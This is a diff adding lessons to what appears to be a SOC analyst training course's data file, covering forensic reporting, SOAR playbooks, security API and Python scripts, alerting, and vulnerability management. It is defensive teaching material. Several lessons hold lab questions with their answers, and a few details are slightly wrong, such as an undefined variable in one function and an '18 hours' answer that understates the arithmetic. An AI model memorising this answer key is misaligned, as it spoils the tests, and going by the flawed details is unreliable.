+│   ├── Acquisition procedures
+│   ├── Analysis techniques applied
+│   └── Validation steps performed
+├── 4. Detailed Findings
+│   ├── Timeline of events
+│   ├── Artifact analysis (with screenshots)
+│   ├── Technical evidence descriptions
+│   └── Supporting data references
+├── 5. Conclusions
+│   ├── Interpretation of findings
+│   ├── Confidence levels
+│   └── Limitations and caveats
+└── 6. Appendices
+    ├── Full hash values
+    ├── Tool output logs
+    ├── Complete file listings
+    └── Glossary of terms
+\`\`\`
+
+## Writing Principles
+
+### Objectivity
+- Report facts, not opinions
+- Use "the evidence shows" not "the suspect did"
+- Document what you found AND what you didn't find
+- State confidence levels: "consistent with" vs "conclusively proves"
+
+### Reproducibility
+- Document every step so another examiner can repeat your work
+- Record tool versions and exact commands used
+- Hash everything — original evidence, extracted files, report itself
+
+### Audience Awareness
+\`\`\`
+Technical audience:    Include raw data, queries, hex dumps
+Legal audience:        Translate technical findings to plain language
+Executive audience:    Focus on business impact and recommendations
+Law enforcement:       Emphasize chain of custody and admissibility
+\`\`\`
+
+## Expert Witness Preparation
+
+### Before Court
+- Review your report thoroughly — you may be questioned on any detail
+- Prepare visual aids (timelines, diagrams) for complex concepts
+- Anticipate cross-examination questions
+- Understand the limits of your expertise
+
+### During Testimony
+\`\`\`
+DO:
+  ✓ Speak clearly and avoid jargon
+  ✓ Answer only what is asked
+  ✓ Say "I don't know" when appropriate
+  ✓ Refer to your report for specific details
+  ✓ Explain technical concepts with analogies
+
+DON'T:
+  ✗ Speculate beyond the evidence
+  ✗ Advocate for either side
+  ✗ Get defensive under cross-examination
+  ✗ Use absolute terms ("always," "never," "impossible")
+  ✗ Discuss evidence not in your report
+\`\`\`
+
+## Common Pitfalls
+
+1. **Incomplete chain of custody** — Every transfer must be documented
+2. **Tool validation** — Using unvalidated tools undermines credibility
+3. **Bias in analysis** — Confirmation bias can lead to missed evidence
+4. **Scope creep** — Examine only what's authorized
+5. **Timestamp confusion** — Always document timezone and synchronization status
+    `,
+    keyTakeaways: [
+      "Reports must include executive summary, methodology, findings, conclusions, and appendices",
+      "Objectivity, reproducibility, and audience awareness are the core writing principles",
+      "Expert witnesses must speak clearly, answer only what's asked, and avoid speculation",
+      "Chain of custody, tool validation, and bias avoidance are critical for legal admissibility"
+    ],
+  },
+
+  // ==========================================
+  // MODULE 10: SECURITY AUTOMATION & SOAR
+  // ==========================================
+  {
+    id: "10.1",
+    courseId: "soc-analyst-path",
+    title: "Introduction to SOAR Platforms",
+    content: `
+# Introduction to SOAR Platforms
+
+Security Orchestration, Automation, and Response (SOAR) platforms transform how SOCs operate by automating repetitive tasks and orchestrating complex workflows across multiple security tools.
+
+## What is SOAR?
+
+\`\`\`
+SOAR Components:
+├── Orchestration — Connecting and coordinating multiple security tools
+├── Automation — Executing predefined actions without human intervention
+└── Response — Taking containment and remediation actions at machine speed
+\`\`\`
+
+## Why SOAR Matters
+
+### The SOC Problem
+- Average SOC receives **10,000+ alerts per day**
+- Analysts spend 70% of time on repetitive tasks
+- Mean time to respond (MTTR) is often hours or days
+- Alert fatigue leads to missed genuine threats
+
+### SOAR Solution
+- Automate Tier 1 triage → reduce alert volume by 80%
+- Enrich alerts automatically → faster analyst decisions
+- Execute containment in seconds → reduce MTTR to minutes
+- Consistent response → no steps missed at 3 AM
+
+## SOAR Architecture
+
+\`\`\`
+┌─────────────┐     ┌─────────────┐     ┌─────────────┐
+│    SIEM     │────→│    SOAR     │────→│   Actions   │
+│  (Alerts)   │     │  (Engine)   │     │  (Response) │
+└─────────────┘     └──────┬──────┘     └─────────────┘
+                           │
+                    ┌──────┴──────┐
+                    │ Integrations│
+                    ├─────────────┤
+                    │ Threat Intel│
+                    │ EDR / AV    │
+                    │ Firewall    │
+                    │ Ticketing   │
+                    │ Email GW    │
+                    │ Directory   │
+                    └─────────────┘
+\`\`\`
+
+## Key SOAR Platforms
+
+| Platform | Type | Best For |
+|----------|------|----------|
+| Palo Alto XSOAR | Commercial | Enterprise, 700+ integrations |
+| Splunk SOAR | Commercial | Splunk-heavy environments |
+| Microsoft Sentinel | Cloud-native | Azure/M365 environments |
+| Shuffle | Open Source | Budget-conscious, learning |
+| TheHive + Cortex | Open Source | Incident response focused |
+
+## Getting Started
+
+1. **Identify top 5 repetitive tasks** — What do analysts do most?
+2. **Map tool integrations** — What APIs are available?
+3. **Start with enrichment** — Low risk, high value automation
+4. **Gradually add response** — Blocking, containment, remediation
+5. **Measure impact** — Track MTTR, analyst time saved
+    `,
+    keyTakeaways: [
+      "SOAR combines orchestration, automation, and response to reduce SOC workload",
+      "Automation can reduce alert volume by 80% and MTTR from hours to minutes",
+      "Start with enrichment automation before implementing response actions",
+      "Both commercial (XSOAR, Splunk SOAR) and open-source (Shuffle, TheHive) options exist"
+    ],
+    practicalExercise: {
+      title: "SOAR Playbook Design",
+      description: "Design an automated response playbook for a common SOC use case.",
+      steps: [
+        "Analyze the phishing scenario",
+        "Identify automation opportunities",
+        "Design the playbook decision logic",
+        "Define human approval checkpoints"
+      ],
+      labScenario: "Your SOC processes an average of 45 phishing reports daily. Currently, each report takes an analyst 25 minutes to investigate manually: checking the sender reputation, extracting and detonating URLs in a sandbox, verifying email authentication headers, searching for other recipients, and removing malicious emails from mailboxes. Management asks you to design a SOAR playbook to automate this workflow. The SOC uses Microsoft 365 for email, CrowdStrike for EDR, and VirusTotal for threat intelligence. Analysts should only be involved for confirmed threats requiring containment.",
+      labQuestions: [
+        {
+          id: "salp-10.1-q1",
+          question: "Which step in the manual process is the best candidate for full automation?",
+          answer: "URL sandbox",
+          hint: "Which step requires no human judgment and can be performed by API calls?"
+        },
+        {
+          id: "salp-10.1-q2",
+          question: "At what point in the playbook should a human analyst be required?",
+          answer: "before containment",
+          hint: "Automated analysis is safe, but taking action that affects users needs human approval."
+        },
+        {
+          id: "salp-10.1-q3",
+          question: "How much analyst time per day could this playbook save?",
+          answer: "18 hours",
+          hint: "Calculate: 45 reports × 25 minutes each, converted to hours."
+        }
+      ]
+    },
+  },
+  {
+    id: "10.2",
+    courseId: "soc-analyst-path",
+    title: "Building Automated Playbooks",
+    content: `
+# Building Automated Playbooks
+
+Automated playbooks are the heart of SOAR — structured workflows that guide investigation and response for specific alert types, replacing manual runbooks with machine-speed execution.
+
+## Playbook Design Principles
+
+\`\`\`
+Good Playbook Design:
+├── Modular — Reusable sub-playbooks for common actions
+├── Idempotent — Safe to run multiple times
+├── Graceful — Handles errors and edge cases
+├── Auditable — Logs every action and decision
+└── Escalatable — Knows when to involve a human
+\`\`\`
+
+## Phishing Response Playbook
+
+\`\`\`
+TRIGGER: Email reported as phishing
+
+STEP 1: Extract IOCs
+  → Parse email headers (sender, reply-to, return-path)
+  → Extract URLs from body and attachments
+  → Extract file hashes from attachments
+  → Identify recipient list
+
+STEP 2: Enrich
+  → Check sender domain against threat intel
+  → Submit URLs to URLScan.io
+  → Check file hashes on VirusTotal
+  → Query WHOIS for sender domain age
+  → Check if sender domain resembles company domains
+
+STEP 3: Score & Classify
+  IF malicious indicators found:
+    → Score = HIGH
+    → Auto-classify as phishing
+  ELIF suspicious indicators:
+    → Score = MEDIUM
+    → Queue for analyst review
+  ELSE:
+    → Score = LOW
+    → Auto-close as clean
+
+STEP 4: Respond (if malicious)
+  → Block sender domain on email gateway
+  → Quarantine email from all recipient mailboxes
+  → Block extracted URLs on proxy/firewall
+  → Reset passwords for users who clicked links
+  → Create incident ticket
+
+STEP 5: Document
+  → Update case with all findings
+  → Generate IOC report
+  → Add indicators to internal blocklist
+  → Notify affected users
+\`\`\`
+
+## Malware Alert Playbook
+
+\`\`\`
+TRIGGER: EDR malware detection alert
+
+STEP 1: Validate Alert
+  → Get alert details from EDR API
+  → Check if host is in scope (not test/dev)
+  → Verify alert is not a known false positive
+
+STEP 2: Enrich
+  → Get file hash reputation (VirusTotal, Hybrid Analysis)
+  → Get user context (role, department, VIP status)
+  → Get host context (asset criticality, recent patches)
+  → Check for related alerts in last 24 hours
+
+STEP 3: Contain (if confirmed malicious)
+  → Isolate endpoint via EDR
+  → Disable user account in Active Directory
+  → Block hash on all endpoints
+  → Block C2 domains/IPs on firewall
+
+STEP 4: Investigate
+  → Pull process tree from EDR
+  → Collect network connections from SIEM
+  → Check for lateral movement indicators
+  → Identify persistence mechanisms
+
+STEP 5: Escalate
+  → IF ransomware indicators → Page IR team
+  → IF data exfiltration → Notify legal/compliance
+  → IF VIP user → Notify management
+\`\`\`
+
+## Decision Points: Human vs Automated
+
+\`\`\`
+AUTOMATE:                    HUMAN DECISION:
+✓ IOC enrichment             ✗ Confirm true positive
+✓ Context gathering          ✗ Approve containment of VIP
+✓ Known-bad blocking         ✗ Determine business impact
+✓ Ticket creation            ✗ Escalation decisions
+✓ Notification sending       ✗ Root cause analysis
+✓ Evidence collection        ✗ Remediation strategy
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Good playbooks are modular, idempotent, graceful with errors, and know when to escalate",
+      "Phishing playbooks automate IOC extraction, enrichment, scoring, and containment",
+      "Malware playbooks should validate, enrich, contain, investigate, and escalate in sequence",
+      "Automate data gathering and known-bad blocking; keep human decisions for impact assessment"
+    ],
+  },
+  {
+    id: "10.3",
+    courseId: "soc-analyst-path",
+    title: "API Integration for Security Tools",
+    content: `
+# API Integration for Security Tools
+
+APIs are the glue that connects security tools. Understanding how to interact with security tool APIs enables automation, enrichment, and orchestrated response.
+
+## REST API Fundamentals
+
+\`\`\`
+HTTP Methods for Security APIs:
+  GET    — Retrieve data (get alert details, lookup IOC)
+  POST   — Create/submit (create ticket, submit sample)
+  PUT    — Update (update alert status, modify rule)
+  DELETE — Remove (delete blocklist entry)
+\`\`\`
+
+### Authentication Types
+| Method | Example | Use Case |
+|--------|---------|----------|
+| API Key | X-Api-Key: abc123 | VirusTotal, AbuseIPDB |
+| Bearer Token | Authorization: Bearer xyz | Splunk, CrowdStrike |
+| Basic Auth | Authorization: Basic base64 | Legacy tools, JIRA |
+| OAuth 2.0 | Access token flow | Microsoft Graph, Google |
+
+## Common Security Tool APIs
+
+### VirusTotal Enrichment
+\`\`\`python
+import requests
+
+VT_API = "https://www.virustotal.com/api/v3"
+
+def check_hash(file_hash):
+    headers = {"x-apikey": API_KEY}
+    resp = requests.get(f"{VT_API}/files/{file_hash}", headers=headers)
+    data = resp.json()
+    stats = data["data"]["attributes"]["last_analysis_stats"]
+    return {
+        "malicious": stats["malicious"],
+        "total": sum(stats.values()),
+        "verdict": "malicious" if stats["malicious"] > 5 else "clean"
+    }
+
+def check_url(url):
+    import base64
+    url_id = base64.urlsafe_b64encode(url.encode()).decode().strip("=")
+    resp = requests.get(f"{VT_API}/urls/{url_id}", headers=headers)
+    return resp.json()
+\`\`\`
+
+### CrowdStrike Falcon: Isolate Host
+\`\`\`python
+def isolate_host(hostname):
+    # Get host ID
+    resp = falcon.get_device_ids(filter=f"hostname:'{hostname}'")
+    host_id = resp["resources"][0]
+    
+    # Contain the host
+    falcon.perform_action(
+        action_name="contain",
+        ids=[host_id]
+    )
+    return f"Host {hostname} isolated successfully"
+\`\`\`
+
+### Microsoft Sentinel: Create Incident
+\`\`\`python
+def create_sentinel_incident(title, severity, description):
+    endpoint = f"/subscriptions/{sub_id}/resourceGroups/{rg}/..."
+    body = {
+        "properties": {
+            "title": title,
+            "severity": severity,  # High, Medium, Low
+            "status": "New",
+            "description": description
+        }
+    }
+    return requests.put(endpoint, json=body, headers=auth_headers)
+\`\`\`
+
+## Error Handling & Rate Limiting
+
+\`\`\`python
+import time
+
+def api_call_with_retry(func, max_retries=3):
+    for attempt in range(max_retries):
+        try:
+            response = func()
+            if response.status_code == 429:  # Rate limited
+                wait = int(response.headers.get("Retry-After", 60))
+                time.sleep(wait)
+                continue
+            response.raise_for_status()
+            return response.json()
+        except requests.exceptions.ConnectionError:
+            time.sleep(2 ** attempt)  # Exponential backoff
+    raise Exception("API call failed after retries")
+\`\`\`
+
+## Integration Best Practices
+
+1. **Never hardcode credentials** — Use environment variables or vaults
+2. **Implement rate limiting** — Respect API quotas
+3. **Log all API calls** — Audit trail for accountability
+4. **Handle failures gracefully** — Don't let one API failure break the workflow
+5. **Cache responses** — Avoid redundant lookups for the same IOC
+    `,
+    keyTakeaways: [
+      "Security APIs use REST with various auth methods — API keys, bearer tokens, OAuth",
+      "VirusTotal, CrowdStrike, and Sentinel APIs enable enrichment, containment, and ticketing",
+      "Always implement retry logic with exponential backoff and rate limit handling",
+      "Never hardcode credentials and always log API calls for audit trails"
+    ],
+  },
+  {
+    id: "10.4",
+    courseId: "soc-analyst-path",
+    title: "Python Scripting for SOC Analysts",
+    content: `
+# Python Scripting for SOC Analysts
+
+Python is the SOC analyst's Swiss Army knife. From log parsing to IOC extraction to automated investigations, Python skills dramatically increase analyst efficiency.
+
+## Essential Libraries
+
+\`\`\`python
+# Core libraries for SOC work
+import re           # Regex for pattern matching
+import json         # Parse JSON logs and API responses
+import csv          # Handle CSV exports
+import hashlib      # File hashing (MD5, SHA256)
+import ipaddress    # IP address validation and analysis
+import datetime     # Timestamp handling
+import requests     # HTTP requests to APIs
+import sqlite3      # Parse SQLite databases (browser history, etc.)
+from collections import Counter  # Frequency analysis
+\`\`\`
+
+## IOC Extraction Script
+
+\`\`\`python
+import re
+
+def extract_iocs(text):
+    """Extract indicators of compromise from text."""
+    iocs = {
+        "ips": re.findall(
+            r'\\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.){3}'
+            r'(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\b', text
+        ),
+        "domains": re.findall(
+            r'\\b[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?'
+            r'(?:\\.[a-zA-Z]{2,})+\\b', text
+        ),
+        "md5": re.findall(r'\\b[a-fA-F0-9]{32}\\b', text),
+        "sha256": re.findall(r'\\b[a-fA-F0-9]{64}\\b', text),
+        "emails": re.findall(r'[\\w.+-]+@[\\w-]+\\.[\\w.]+', text),
+        "urls": re.findall(r'https?://[^\\s<>"{}|\\\\^\\[\\]]+', text),
+    }
+    # Deduplicate
+    return {k: list(set(v)) for k, v in iocs.items()}
+
+# Usage
+report = open("threat_report.txt").read()
+indicators = extract_iocs(report)
+print(f"Found {len(indicators['ips'])} IPs, {len(indicators['domains'])} domains")
+\`\`\`
+
+## Log Parser
+
+\`\`\`python
+def parse_auth_logs(logfile):
+    """Parse authentication logs for failed logins."""
+    failed_logins = Counter()
+    
+    with open(logfile) as f:
+        for line in f:
+            if "Failed password" in line:
+                # Extract IP and username
+                ip_match = re.search(r'from (\\S+)', line)
+                user_match = re.search(r'for (?:invalid user )?(\\S+)', line)
+                if ip_match and user_match:
+                    ip = ip_match.group(1)
+                    user = user_match.group(1)
+                    failed_logins[(ip, user)] += 1
+    
+    # Report potential brute force
+    for (ip, user), count in failed_logins.most_common(20):
+        if count >= 5:
+            print(f"⚠️ BRUTE FORCE: {ip} → {user} ({count} attempts)")
+
+parse_auth_logs("/var/log/auth.log")
+\`\`\`
+
+## File Hasher
+
+\`\`\`python
+import hashlib
+import os
+
+def hash_file(filepath):
+    """Calculate multiple hashes for a file."""
+    md5 = hashlib.md5()
+    sha1 = hashlib.sha1()
+    sha256 = hashlib.sha256()
+    
+    with open(filepath, "rb") as f:
+        while chunk := f.read(8192):
+            md5.update(chunk)
+            sha1.update(chunk)
+            sha256.update(chunk)
+    
+    return {
+        "filename": os.path.basename(filepath),
+        "size": os.path.getsize(filepath),
+        "md5": md5.hexdigest(),
+        "sha1": sha1.hexdigest(),
+        "sha256": sha256.hexdigest()
+    }
+\`\`\`
+
+## Automated Investigation Workflow
+
+\`\`\`python
+def investigate_ip(ip_address):
+    """Run automated investigation on a suspicious IP."""
+    results = {"ip": ip_address, "findings": []}
+    
+    # Check if internal or external
+    ip = ipaddress.ip_address(ip_address)
+    results["is_private"] = ip.is_private
+    
+    # GeoIP lookup
+    geo = requests.get(f"http://ip-api.com/json/{ip_address}").json()
+    results["country"] = geo.get("country", "Unknown")
+    results["isp"] = geo.get("isp", "Unknown")
+    
+    # AbuseIPDB check
+    abuse_resp = requests.get(
+        "https://api.abuseipdb.com/api/v2/check",
+        params={"ipAddress": ip_address},
+        headers={"Key": ABUSE_API_KEY, "Accept": "application/json"}
+    ).json()
+    results["abuse_score"] = abuse_resp["data"]["abuseConfidenceScore"]
+    
+    # Verdict
+    if results["abuse_score"] > 75:
+        results["verdict"] = "MALICIOUS"
+    elif results["abuse_score"] > 25:
+        results["verdict"] = "SUSPICIOUS"
+    else:
+        results["verdict"] = "CLEAN"
+    
+    return results
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Python's re, requests, hashlib, and ipaddress libraries are essential for SOC scripting",
+      "IOC extraction scripts use regex to pull IPs, domains, hashes, and URLs from text",
+      "Log parsers can identify brute force attacks by counting failed authentication attempts",
+      "Automated investigation workflows chain multiple API lookups for rapid IP/domain analysis"
+    ],
+  },
+  {
+    id: "10.5",
+    courseId: "soc-analyst-path",
+    title: "Chatbot & Notification Automation",
+    content: `
+# Chatbot & Notification Automation
+
+Integrating SOC tools with communication platforms like Slack and Microsoft Teams enables real-time alert notifications, interactive response commands, and better team coordination.
+
+## Alert Notification Architecture
+
+\`\`\`
+SIEM Alert → SOAR Platform → Notification Engine → Chat Platform
+                                                    ├── Slack
+                                                    ├── Microsoft Teams
+                                                    ├── PagerDuty
+                                                    └── Email
+\`\`\`
+
+## Slack Integration
+
+### Incoming Webhook for Alerts
+\`\`\`python
+import requests
+import json
+
+SLACK_WEBHOOK = "https://hooks.slack.com/services/T00/B00/xxx"
+
+def send_alert_to_slack(alert):
+    severity_emoji = {
+        "critical": "🔴", "high": "🟠",
+        "medium": "🟡", "low": "🟢"
+    }
+    
+    payload = {
+        "blocks": [
+            {
+                "type": "header",
+                "text": {"type": "plain_text",
+                         "text": f"{severity_emoji[alert['severity']]} Security Alert"}
+            },
+            {
+                "type": "section",
+                "fields": [
+                    {"type": "mrkdwn", "text": f"*Alert:* {alert['title']}"},
+                    {"type": "mrkdwn", "text": f"*Severity:* {alert['severity'].upper()}"},
+                    {"type": "mrkdwn", "text": f"*Source:* {alert['source_ip']}"},
+                    {"type": "mrkdwn", "text": f"*Host:* {alert['hostname']}"},
+                ]
+            },
+            {
+                "type": "actions",
+                "elements": [
+                    {"type": "button", "text": {"type": "plain_text", "text": "🔍 Investigate"},
+                     "action_id": "investigate", "value": alert["id"]},
+                    {"type": "button", "text": {"type": "plain_text", "text": "✅ Acknowledge"},
+                     "action_id": "acknowledge", "value": alert["id"]},
+                    {"type": "button", "text": {"type": "plain_text", "text": "🚫 Block IP"},
+                     "action_id": "block_ip", "value": alert["source_ip"],
+                     "style": "danger"},
+                ]
+            }
+        ]
+    }
+    requests.post(SLACK_WEBHOOK, json=payload)
+\`\`\`
+
+### Interactive Bot Commands
+\`\`\`
+SOC Bot Commands:
+  /soc lookup <IP/domain/hash>  — Check reputation across threat intel
+  /soc whois <domain>           — Quick WHOIS lookup
+  /soc block <IP>               — Add to firewall blocklist
+  /soc isolate <hostname>       — Isolate endpoint via EDR
+  /soc status                   — Current alert queue summary
+  /soc oncall                   — Show who's on call
+\`\`\`
+
+## Notification Best Practices
+
+### Alert Fatigue Prevention
+\`\`\`
+Notification Tiers:
+├── Critical — Immediate: Slack + PagerDuty + Phone call
+├── High — Prompt: Slack alert channel + email
+├── Medium — Standard: Slack alert channel
+└── Low — Batch: Daily digest email
+\`\`\`
+
+### Channel Organization
+\`\`\`
+#soc-alerts-critical  — Critical/high severity (small, focused team)
+#soc-alerts           — All alerts (general awareness)
+#soc-investigations   — Active investigation threads
+#soc-handover         — Shift handover notes
+#soc-threat-intel     — New threat intel and IOCs
+\`\`\`
+
+## Escalation Automation
+
+\`\`\`
+Escalation Rules:
+  IF alert.severity == "critical" AND no_acknowledgment_in(15min):
+    → Page on-call analyst via PagerDuty
+    
+  IF alert.severity == "critical" AND no_acknowledgment_in(30min):
+    → Escalate to SOC manager
+    → Send SMS to IR team lead
+    
+  IF alert involves VIP user:
+    → Notify CISO via private message
+    → Create priority ticket
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Slack webhooks enable rich alert notifications with interactive buttons for response actions",
+      "Bot commands let analysts perform lookups, blocking, and isolation directly from chat",
+      "Tier notifications by severity to prevent alert fatigue — critical gets paged, low gets batched",
+      "Organize channels by function: alerts, investigations, handover, and threat intel"
+    ],
+  },
+  {
+    id: "10.6",
+    courseId: "soc-analyst-path",
+    title: "Measuring Automation ROI & Metrics",
+    content: `
+# Measuring Automation ROI & Metrics
+
+Quantifying the impact of SOC automation is essential for justifying investment, guiding improvements, and demonstrating value to stakeholders.
+
+## Key Automation Metrics
+
+\`\`\`
+Metric Categories:
+├── Efficiency Metrics
+│   ├── MTTR (Mean Time to Respond) — Before vs after automation
+│   ├── MTTD (Mean Time to Detect) — Speed of detection improvement
+│   ├── Alerts handled per analyst per shift
+│   └── Time spent on repetitive tasks
+├── Quality Metrics
+│   ├── False positive rate reduction
+│   ├── Missed alert rate
+│   ├── Consistent response execution (no skipped steps)
+│   └── Enrichment completeness
+├── Volume Metrics
+│   ├── Total alerts processed by automation
+│   ├── Alerts auto-closed vs escalated
+│   ├── Playbook execution count
+│   └── API calls made by automation
+└── Business Metrics
+    ├── Cost per alert (labor + tools)
+    ├── Analyst satisfaction score
+    ├── Headcount efficiency gain
+    └── Incident containment time
+\`\`\`
+
+## ROI Calculation
+
+### Before Automation
+\`\`\`
+Daily alerts: 500
+Avg time per alert (manual): 15 minutes
+Analyst capacity: 8 hours/shift = 32 alerts/analyst
+Analysts needed: 500/32 = ~16 analysts
+Annual labor cost: 16 × $85,000 = $1,360,000
+\`\`\`
+
+### After Automation
+\`\`\`
+Daily alerts: 500
+Auto-resolved (70%): 350 alerts (0 analyst time)
+Remaining (30%): 150 alerts
+Avg time per alert (enriched): 8 minutes
+Analyst capacity: 60 alerts/analyst
+Analysts needed: 150/60 = 3 analysts
+Annual labor cost: 3 × $85,000 = $255,000
+SOAR platform cost: $150,000/year
+Total: $405,000
+
+SAVINGS: $955,000/year (70% reduction)
+\`\`\`
+
+## Dashboard Design
+
+### Automation Performance Dashboard
+\`\`\`
+┌─────────────────────────────────────────────┐
+│  SOAR Performance Dashboard                 │
+├─────────────┬───────────────┬───────────────┤
+│ Alerts Today│ Auto-Resolved │ MTTR          │
+│    487      │  342 (70%)    │ 4.2 min ↓     │
+├─────────────┴───────────────┴───────────────┤
+│ [Playbook Execution Trend - Line Chart]     │
+│ [Top 5 Playbooks by Volume - Bar Chart]     │
+│ [Auto-Close Rate by Alert Type - Pie Chart] │
+├─────────────────────────────────────────────┤
+│ Failed Playbooks: 3  │ Avg Enrichment: 12s  │
+│ Human Escalations: 145│ API Calls: 15,234   │
+└─────────────────────────────────────────────┘
+\`\`\`
+
+## Continuous Improvement
+
+### Monthly Review Checklist
+1. Review playbook success/failure rates
+2. Identify new automation candidates from analyst feedback
+3. Update enrichment sources — are they still accurate?
+4. Check for new false positive patterns to auto-close
+5. Validate that automated blocks haven't caused business impact
+6. Survey analyst satisfaction with automation tools
+
+### Maturity Model
+\`\`\`
+Level 1: Manual — All alerts handled manually
+Level 2: Enrichment — Auto-enrichment, manual response
+Level 3: Semi-Auto — Auto-triage + manual confirmation for actions
+Level 4: Full Auto — Auto-respond to known scenarios, human for novel
+Level 5: Adaptive — ML-driven automation that learns from analyst decisions
+\`\`\`
+    `,
+    keyTakeaways: [
+      "Track MTTR, auto-close rate, false positive reduction, and cost per alert",
+      "Automation can reduce SOC labor costs by 70% while improving response times",
+      "Dashboard should show playbook performance, auto-resolution rates, and failure trends",
+      "Monthly reviews should check playbook health, new automation opportunities, and analyst satisfaction"
+    ],
+  },
+
+  // ==========================================
+  // MODULE 11: VULNERABILITY MANAGEMENT
+  // ==========================================
+  {
+    id: "11.1",
+    courseId: "soc-analyst-path",
+    title: "Vulnerability Management Lifecycle",
+    content: `
+# Vulnerability Management Lifecycle
+
+Vulnerability management is a continuous process of identifying, classifying, remediating, and mitigating security weaknesses. For SOC analysts, understanding this lifecycle is crucial for prioritizing alerts and coordinating with IT teams.
+
+## The VM Lifecycle
+
+\`\`\`
+┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
+│ Discover │──→│  Assess  │──→│Prioritize│──→│Remediate │──→│ Verify   │
+│ & Scan   │   │ & Classify│  │ & Plan   │   │ & Patch  │   │ & Report │
+└──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘
+      ↑                                                           │
+      └───────────────── Continuous Cycle ─────────────────────────┘
+\`\`\`
+
+### Phase 1: Discovery & Scanning
+- **Asset inventory** — You can't protect what you don't know about
+- **Authenticated scans** — Log into systems for deeper analysis
+- **Unauthenticated scans** — External attacker perspective
+- **Agent-based scanning** — Continuous monitoring on endpoints
+
+### Phase 2: Assessment & Classification
+\`\`\`
+Vulnerability Classification:
+├── Critical — Remote code execution, no authentication required
+├── High — Privilege escalation, data exposure
+├── Medium — Denial of service, information disclosure
+├── Low — Minor configuration issues
+└── Informational — Best practice recommendations
+\`\`\`
+
+### Phase 3: Prioritization
+Not all vulnerabilities are equal. Prioritize using:
+- **CVSS score** — Technical severity (0-10)
+- **Asset criticality** — Is the system critical to business?
+- **Exploitability** — Is there a known exploit in the wild?
+- **Exposure** — Is the system internet-facing?
+- **Compensating controls** — Are there mitigations in place?
+
+### Phase 4: Remediation
+\`\`\`
+Remediation Options:
+├── Patch — Apply vendor security update (preferred)
+├── Workaround — Disable vulnerable feature/service
+├── Compensating Control — Add firewall rule, WAF, or IPS signature
+├── Accept Risk — Document and get management approval
+└── Retire — Decommission the vulnerable system
+\`\`\`
+
+### Phase 5: Verification & Reporting
+- Re-scan to confirm remediation
+- Update tickets and tracking
+- Generate compliance reports
+- Track SLA adherence
+- Report trends to management
+
+## SOC Analyst's Role in VM
+
+\`\`\`
+SOC Responsibilities:
+├── Monitor for exploit attempts targeting known vulnerabilities
+├── Correlate vulnerability data with SIEM alerts
+├── Escalate when critical vulnerabilities are being exploited
+├── Validate that patches haven't introduced new issues
+└── Track vulnerability-related incidents for trending
+\`\`\`
+    `,
+    keyTakeaways: [
+      "The VM lifecycle is continuous: discover, assess, prioritize, remediate, and verify",
+      "Prioritize vulnerabilities by CVSS score, asset criticality, exploitability, and exposure",
+      "Remediation options include patching, workarounds, compensating controls, and risk acceptance",
+      "SOC analysts correlate vulnerability data with SIEM alerts to detect active exploitation"
+    ],
+    practicalExercise: {
+      title: "Vulnerability Prioritization Exercise",
+      description: "Prioritize vulnerabilities based on CVSS scores, asset criticality, and active exploitation.",
+      steps: [
+        "Review the vulnerability scan results",
+        "Assess each vulnerability's risk factors",
+        "Determine remediation priority order",
+        "Answer the questions based on your analysis"
+      ],
+      labScenario: "Your weekly vulnerability scan returns four critical findings. Vuln-A: CVE-2024-5678 (CVSS 9.8) — Remote Code Execution in Apache Struts on the public-facing web server handling customer payments, with active exploitation reported in the wild. Vuln-B: CVE-2024-4321 (CVSS 9.1) — SQL Injection in an internal HR application accessible only from the corporate network, no known exploits. Vuln-C: CVE-2024-8765 (CVSS 7.5) — Privilege Escalation in Windows Print Spooler on 200 employee workstations, proof-of-concept exploit published last week. Vuln-D: CVE-2024-1111 (CVSS 10.0) — Authentication Bypass in a test server with no production data, isolated in a lab network.",
+      labQuestions: [
+        {
+          id: "11.1-q1",
+          question: "Which vulnerability should be patched FIRST based on risk prioritization?",
+          answer: "Vuln-A",
+          hint: "Consider which combines high CVSS, internet exposure, critical data, and active exploitation."
+        },
+        {
+          id: "11.1-q2",
+          question: "What is the CVSS score of the Apache Struts RCE vulnerability?",
+          answer: "9.8",
+          hint: "Check the CVSS score listed for Vuln-A."
+        },
+        {
+          id: "11.1-q3",
+          question: "Despite having the highest CVSS score (10.0), why is Vuln-D lower priority?",
+          answer: "isolated test server",
+          hint: "Consider the asset's network exposure and data sensitivity."
+        }
+      ]
+    }
+  },
+  {
+    id: "11.2",
+    courseId: "soc-analyst-path",
+    title: "Scanning Tools: Nessus, Qualys & OpenVAS",
+    content: `
+# Scanning Tools: Nessus, Qualys & OpenVAS
+
+Vulnerability scanners are essential tools that automate the discovery of security weaknesses across your infrastructure. Each tool has strengths suited to different environments.
+
+## Tool Comparison
+
+| Feature | Nessus Pro | Qualys VMDR | OpenVAS |
+|---------|-----------|-------------|---------|
+| Type | On-premise | Cloud-based | Open-source |
+| Cost | ~$3,500/yr | Enterprise pricing | Free (Community) |
+| Plugin count | 200,000+ | 200,000+ | 80,000+ |
+| Agent support | Yes | Yes | Limited |
+| Compliance | PCI, CIS, STIG | PCI, CIS, STIG | CIS, DISA |
+| Best for | SMB, pen testing | Enterprise, cloud | Budget, learning |
+
+## Nessus
+
+### Scan Configuration
+\`\`\`
+Scan Types:
+├── Basic Network Scan — General vulnerability assessment
+├── Advanced Scan — Customized checks, compliance auditing
+├── Web Application Tests — OWASP vulnerabilities
+├── Credentialed Patch Audit — Check installed patches
+└── Malware Scan — Detect known malware on systems
+\`\`\`
+
+### Key Settings
+- **Scan frequency** — Weekly for critical, monthly for standard
+- **Scan window** — Off-hours to minimize business impact
+- **Credentials** — Use dedicated service accounts with minimal privileges
+- **Port range** — Full port scan (1-65535) for thorough coverage
+- **Plugin families** — Enable all relevant families for your environment
+
+## Qualys VMDR
+
+### Cloud Agent Architecture
+\`\`\`
+Qualys Cloud Platform
+├── Cloud Agents (installed on endpoints)
+│   ├── Continuous assessment
+│   ├── Minimal resource usage
+│   └── Works behind firewalls
+├── Scanner Appliances (network scanning)
+│   ├── Internal scanning
+│   └── DMZ scanning
+└── External Scanners (internet-facing assets)
+    ├── Perimeter assessment
